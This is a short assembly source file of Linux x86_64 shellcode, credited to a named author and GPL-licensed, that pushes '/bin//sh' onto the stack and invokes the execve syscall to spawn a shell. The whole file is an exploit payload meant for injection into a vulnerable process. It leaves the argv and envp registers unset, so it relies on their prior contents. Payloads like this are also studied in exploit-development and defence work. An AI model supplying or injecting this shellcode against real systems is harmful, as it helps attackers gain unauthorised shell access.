    #
    # Execve /bin/sh Shellcode Via Push (Linux x86_64)
    #
    # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
    #
    # 27 April 2015
    #
    # GPL
    #


    .global _start
_start:
    xorl %ecx, %ecx

    pushq %rcx

    pushw $0x6873
    pushw $0x2f2f
    pushw $0x6e69
    pushw $0x622f

    movq %rsp, %rdi

    pushq $59
    popq %rax

    syscall
